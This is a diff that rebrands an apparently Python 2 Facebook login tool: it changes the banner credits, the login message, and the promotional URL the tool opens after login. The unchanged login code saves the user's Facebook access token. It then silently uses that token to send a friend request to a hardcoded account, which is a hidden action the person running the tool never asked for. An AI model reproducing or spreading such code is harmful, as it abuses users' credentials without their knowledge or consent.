@@ -55,12 +55,12 @@ logo = """
 \033[1;92m██████╔╝███████╗░░╚██╔╝░░██║███████╗
 \033[1;92m╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝
 \033[1;93m🔥╭╬──────────────────────────────────╬╮🔥
-\033[0;91m  ⚡ ✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 ✪ 𝑹𝒂𝒇𝒊𝒏 𝑨𝒉𝒎𝒆𝒅   ✬⚡
-\033[1;95m  ⚡ ✯ 𝕴𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒 ✪ 👑RaFiN Chowdhury💫  ✬⚡
-\033[0;94m  ⚡ ✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ✪ Feelings Creations ✬⚡
-\033[1;90m  ⚡ ✯ 𝕱𝖆𝖈𝖊𝖇𝖔𝖔𝖐 ✪ I.FueK.YoUr.MiNd.BnXD  ✬⚡
-\033[1;97m  ⚡ ✯ 𝕲𝖎𝖙𝖍𝖚𝖇 ✪ https://github.com/Shymon-Hasan✬⚡
-\033[0;93m  ⚡ ✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ✬⚡
+\033[0;91m  ⚡ ✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 ✪ 𝑹𝒂𝒇𝒊𝒏 𝑨𝒉𝒎𝒆𝒅                  ✬⚡
+\033[1;95m  ⚡ ✯ 𝕴𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒 ✪ 👑RaFiN Chowdhury💫      ✬⚡
+\033[0;94m  ⚡ ✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ✪ Feelings Creations         ✬⚡
+\033[1;90m  ⚡ ✯ 𝕱𝖆𝖈𝖊𝖇𝖔𝖔𝖐 ✪ I.FueK.YoUr.MiNd.BnXD      ✬⚡
+\033[1;97m  ⚡ ✯ 𝕲𝖎𝖙𝖍𝖚𝖇 ✪ https://github.com/ShymonHasan✬⚡
+\033[0;93m  ⚡ ✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊        ✬⚡
 \033[1;93m🔥╰╬──────────────────────────────────╬╯🔥 """
                                                 
 def tik():
@@ -140,15 +140,15 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.facebook.com/I.FueK.YoUr.MiNd.BnXD')
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Done SH'
+				os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
+			print("\n\033[1;96m[!] \x1b[1;91mYour Id checkpoint SH")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
